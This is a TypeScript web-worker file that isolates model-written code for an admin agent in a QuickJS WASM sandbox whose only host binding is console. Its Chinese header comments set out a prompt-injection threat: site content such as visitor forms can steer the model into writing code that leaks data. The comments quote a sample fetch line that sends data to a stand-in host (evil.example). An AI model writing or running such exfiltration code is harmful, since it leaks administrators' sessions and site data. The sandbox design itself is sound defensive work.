import type { QuickJSContext, QuickJSHandle } from "quickjs-emscripten-core";
import type {
  CodeSandboxRequest,
  CodeSandboxResponse,
} from "./code-sandbox-protocol";

// docs/spec-admin-agent.md §4.7:JS 沙盒的執行端。**這一檔是整個功能的安全根據。**
//
// ── 為什麼不是 eval / new Function ──────────────────────────────────────────
// 這段程式碼是**模型寫的**,而模型的脈絡裡有 read tool 撈回來的站台內容 —— 包含
// 訪客送進來的表單、留言那種任何人都寫得進去的東西。一個被注入的模型可以寫出
//
//     fetch("https://evil.example/?d=" + encodeURIComponent(資料))
//
// 而 eval / new Function 跑在**這個分頁自己的 realm** 裡:它拿得到 fetch、拿得到
// cookie(同源請求會自動帶上 admin 的 session)、拿得到 localStorage、拿得到 DOM。
// 即使把 window 的某幾個屬性遮掉,逃逸口是列不完的(`constructor.constructor`、
// `import()`、iframe 的 contentWindow…),而「我們有沒有漏掉一個」這個問題沒有人
// 答得出來。
//
// ── 為什麼不是「拔掉全域變數的 Web Worker」──────────────────────────────────
// 同一個問題換個地方。worker 裡照樣有 fetch / XMLHttpRequest / WebSocket /
// importScripts,而 null-origin 之類的招數只擋得住**讀回應**,擋不住**送出去** ——
// 那個請求已經帶著資料離開瀏覽器了。外洩不需要回應。
//
// ── QuickJS 為什麼不同 ───────────────────────────────────────────────────────
// QuickJS 是一顆編成 WASM 的 JS 直譯器,它的 host binding **預設是全空的**:
// 沒有 fetch、沒有 XHR、沒有 WebSocket、沒有 DOM、沒有 storage、沒有 timer、
// 沒有 import —— 除非我們自己接上去。guest 裡只有 ECMAScript 語言本身的東西
// (Math / Date / JSON / Array / RegExp…)。所以邊界是**構造上**的:不是「我們記得
// 拔乾淨每一個逃逸口」,而是「那些東西從來沒有被放進去過」。
//
// 本檔只接**一個** host binding:console(log/info/warn/error 共用一支),而它做的
// 事只有「把字串收進一個陣列」。那是這個檔案裡唯一一道從 guest 通往外面的門,而門
// 後面是一個 string[]。
//
// ── Web Worker 是為了「能殺」,不是為了隔離 ─────────────────────────────────
// 隔離由 QuickJS 給。worker 給的是**可停性**:`while(true){}` 在主執行緒上會凍住
// 整個後台,而 worker.terminate() 一定停得下來。QuickJS 自己的 interrupt handler
// 是第一道(它能回一個乾淨的錯誤訊息),terminate 是第二道 —— 專門對付
// interrupt handler 進不去的情況(例如一個單一的巨量配置)。
//
// ── 沒有跨呼叫狀態 ──────────────────────────────────────────────────────────
// 一個 worker 跑一次就被 terminate,runtime 與 context 也都在這裡建、在這裡 dispose。
// 有狀態的沙盒會讓「第 3 次呼叫為什麼結果不同」變成不可能除錯的東西。
//
// ── 為什麼 quickjs-emscripten-core + singlefile 變體 ────────────────────────
// 主套件 `quickjs-emscripten` 的進入點**靜態** re-export 四個變體
// (debug/release × sync/asyncify),打包器因此會把四份 wasm 都吐進 .next/static
// (約 6MB),即使永遠只載得到其中一份。改成 core + 明確指定一個變體之後,圖裡
// 只剩那一份。選 singlefile-browser 而不是 wasmfile 的理由是它把 wasm 以 base64
// 內嵌在 JS 裡:不必解析 `.wasm` 的資產 URL、不必多一次 fetch、不受 publicPath 與
// 靜態資產服務方式影響 —— 少三個在瀏覽器裡才會發現的失敗模式。
//
// 兩個 import 都是**動態的**,而且只在收到訊息之後才發生:worker 本身被建立時不會
// 載入任何 WASM。

/**
 * worker 全域。lib.dom 之下 `self` 是 Window,而 Window.postMessage 的簽章要
 * targetOrigin —— 所以這裡窄化成一個只有兩個成員的介面,而不是把 lib.webworker
 * 加進 tsconfig(那會與 lib.dom 在幾十個名字上打架)。
 */
interface WorkerScope {
  postMessage: (message: unknown) => void;
  addEventListener: (
    type: "message",
    listener: (event: { data: unknown }) => void,
  ) => void;
}

const scope = self as unknown as WorkerScope;

/** 例外 → 一句話。 */
function describe(e: unknown): string {
  if (e instanceof Error) return `${e.name}: ${e.message}`;
  return typeof e === "string" ? e : "unknown error";
}

/**
 * 釋放,但**不准因為釋放失敗而弄丟結果**。
 *
 * `dispose()` 真的會 throw:實測(Node 26 + quickjs-emscripten-core 0.32)一段
 * 爆掉宿主堆疊的程式碼跑完之後,`runtime.dispose()` 會讓整個 WASM 模組 abort
 * (JS_FreeRuntime 的 gc_obj_list 斷言)。那個 throw 發生在 `finally` 裡,會**取代**
 * 我們已經算好的回傳值 —— 於是一次「其實有錯誤訊息可以回報」的執行,變成了主執行緒
 * 那邊的一次逾時。
 *
 * 吞掉它是安全的,而且不是省事:這個 worker 收到一則訊息、回一則訊息、然後就被
 * terminate(見 code-sandbox.ts)。沒釋放的記憶體隨著整個 worker 一起消失,不存在
 * 「累積洩漏」這回事 —— 那正是「每次執行一個乾淨的 worker」順帶買到的東西。
 * CODE_STACK_LIMIT_BYTES 的註解說明了怎麼一開始就不要走到這裡。
 */
function discard(dispose: () => void): void {
  try {
    dispose();
  } catch {
    /* worker 即將 terminate,記憶體隨它一起走 */
  }
}

/**
 * guest 的值 → 一段給人看的字(console.log 用)。
 *
 * 字串直接取字面(不要引號 —— 那是 log,不是 JSON);其餘走 dump 之後再 JSON 化。
 * 兩者都失敗就退成 `[typeof]`:一行 log 印不出來不該讓整段程式碼失敗。
 */
function formatForLog(context: QuickJSContext, handle: QuickJSHandle): string {
  const kind = context.typeof(handle);
  try {
    if (kind === "string") return context.getString(handle);
    const dumped: unknown = context.dump(handle);
    if (typeof dumped === "string") return dumped;
    return JSON.stringify(dumped) ?? String(dumped);
  } catch {
    return `[${kind}]`;
  }
}

/**
 * 接上 console。**這是唯一一個 host binding**(見檔頭)。
 *
 * info / warn / error 共用同一支函式:模型分不清這個站要它用哪一個,而 logs 是一個
 * 平的字串陣列 —— 分級只會多一個沒有人讀的欄位。
 *
 * callback 收到的 handle **由 VM 擁有**,不能在這裡 dispose(quickjs-emscripten 的
 * 契約:呼叫端負責釋放)。
 */
function installConsole(context: QuickJSContext, logs: string[]): void {
  const log = context.newFunction("log", (...args) => {
    logs.push(args.map((arg) => formatForLog(context, arg)).join(" "));
  });
  const consoleObject = context.newObject();
  for (const name of ["log", "info", "warn", "error", "debug"]) {
    context.setProp(consoleObject, name, log);
  }
  context.setProp(context.global, "console", consoleObject);
  consoleObject.dispose();
  log.dispose();
}

/**
 * 最後一個運算式的值 → 可以送回主執行緒的形狀(見 AgentCodeRun 的說明)。
 *
 * ── 為什麼序列化要在 guest 裡做,而不是 `context.dump()` + host 的 JSON.stringify ──
 * dump() 內部就是「VM 內 JSON 化 → host 端 JSON.parse」,而**它失敗時會安靜地退成
 * 一段字串**。實測(Node,quickjs-emscripten-core 0.32):一個迴圈參照的物件經
 * dump() 回來是 host 字串 `"[object Object]"` —— 於是 host 端的 JSON.stringify 成功,
 * 模型收到 `result: "[object Object]"` 並把它當成一個**貨真價實的字串答案**。
 * 那是這個功能最不能有的失敗模式:一個看起來成功的錯誤。
 *
 * 直接呼叫 guest 的 `JSON.stringify` 就沒有這個縫:迴圈參照會在 VM 裡丟 TypeError
 * (我們拿到 res.error),`toJSON()` 回字串會正確地回一個帶引號的 JSON 字串,
 * 沒有 JSON 形式的值會回 undefined。三種情形分得開。
 *
 * undefined / function / symbol / bigint 仍然在前面先擋:它們都是**模型自己寫錯**
 * 的典型(尤其「忘了讓最後一個運算式是那個值」),值得一句專屬的話,而不是一句
 * 通用的「序列化不出來」。
 */
function serialiseResult(
  context: QuickJSContext,
  handle: QuickJSHandle,
): Pick<CodeSandboxResponse, "resultJson" | "resultNote"> {
  const kind = context.typeof(handle);
  if (kind === "undefined") {
    return {
      resultNote:
        "the last expression evaluated to undefined — what comes back is the value of the final expression, so end the snippet with the value you want.",
    };
  }
  if (kind === "function" || kind === "symbol" || kind === "bigint") {
    return {
      resultNote: `the last expression is a ${kind}, which has no JSON form. Return a number, string, array or plain object instead.`,
    };
  }

  const json = context.getProp(context.global, "JSON");
  try {
    const called = context.callMethod(json, "stringify", [handle]);
    if (called.error) {
      // 迴圈參照,或 guest 自己把 JSON 換掉了。丟掉內容也要留下形狀 —— 模型看得到
      // 「有東西但讀不到」,才會改成回一個平的值。
      const thrown: unknown = context.dump(called.error);
      called.error.dispose();
      const detail =
        thrown && typeof thrown === "object" && "message" in thrown
          ? String((thrown as { message?: unknown }).message)
          : String(thrown);
      return {
        resultNote: `the result could not be serialised (${detail}). Return a plain value — a number, string, array or flat object.`,
      };
    }
    try {
      // JSON.stringify 回 undefined = 這個值沒有 JSON 形式(例如 toJSON() 回
      // undefined)。缺席要有理由,不能靜靜地不見。
      if (context.typeof(called.value) === "undefined") {
        return { resultNote: "the last expression has no JSON form." };
      }
      return { resultJson: context.getString(called.value) };
    } finally {
      discard(() => called.value.dispose());
    }
  } catch (e) {
    return {
      resultNote: `the result could not be serialised (${describe(e)}). Return a plain value instead.`,
    };
  } finally {
    discard(() => json.dispose());
  }
}

/** 跑一次。永不 throw:每一條路都回一個 CodeSandboxResponse。 */
async function run(request: CodeSandboxRequest): Promise<CodeSandboxResponse> {
  const logs: string[] = [];

  // 惰性載入(見檔頭)。這兩個 import 是整個 /admin/agent 之中最大的一塊,而它們
  // 只在 admin 真的讓一段程式碼跑起來的那一刻才被抓下來。
  let module_;
  let shouldInterruptAfterDeadline;
  try {
    const [core, variant] = await Promise.all([
      import("quickjs-emscripten-core"),
      import("@jitl/quickjs-singlefile-browser-release-sync"),
    ]);
    shouldInterruptAfterDeadline = core.shouldInterruptAfterDeadline;
    module_ = await core.newQuickJSWASMModuleFromVariant(variant.default);
  } catch (e) {
    return {
      ok: false,
      logs,
      error: `the sandbox could not be loaded in the administrator's browser (${describe(e)}). Do not retry; answer without running code.`,
    };
  }

  const runtime = module_.newRuntime();
  try {
    // 記憶體與堆疊上限是**可停性**邊界,不是安全邊界(安全邊界見檔頭):它們讓
    // 「一次配置一 GB」與「無窮遞迴」在 QuickJS 內就拋錯,而不是把分頁拖到連
    // terminate 都來不及。
    runtime.setMemoryLimit(request.memoryLimitBytes);
    runtime.setMaxStackSize(request.stackLimitBytes);
    runtime.setInterruptHandler(
      shouldInterruptAfterDeadline(Date.now() + request.timeoutMs),
    );

    const context = runtime.newContext();
    try {
      installConsole(context, logs);
      const result = context.evalCode(request.code);
      if (result.error) {
        const dumped: unknown = context.dump(result.error);
        result.error.dispose();
        const detail =
          dumped && typeof dumped === "object" && "message" in dumped
            ? String((dumped as { name?: unknown; message?: unknown }).name ?? "Error") +
              ": " +
              String((dumped as { message?: unknown }).message)
            : String(dumped);
        return { ok: false, logs, error: detail };
      }
      try {
        return { ok: true, logs, ...serialiseResult(context, result.value) };
      } finally {
        discard(() => result.value.dispose());
      }
    } finally {
      discard(() => context.dispose());
    }
  } catch (e) {
    // interrupt handler 觸發、記憶體上限、或 VM 自己出事。**已經收集到的 logs
    // 照樣送回去** —— 一段跑到一半被中斷的程式碼,它印出來的東西往往正好指出
    // 它卡在哪裡。
    return { ok: false, logs, error: describe(e) };
  } finally {
    discard(() => runtime.dispose());
  }
}

scope.addEventListener("message", (event) => {
  const request = event.data as CodeSandboxRequest;
  void run(request).then(
    (response) => scope.postMessage(response),
    // run() 不會 throw,但這條線斷了就是「主執行緒等到逾時」,所以仍然接住。
    (e: unknown) => scope.postMessage({ ok: false, logs: [], error: describe(e) }),
  );
});
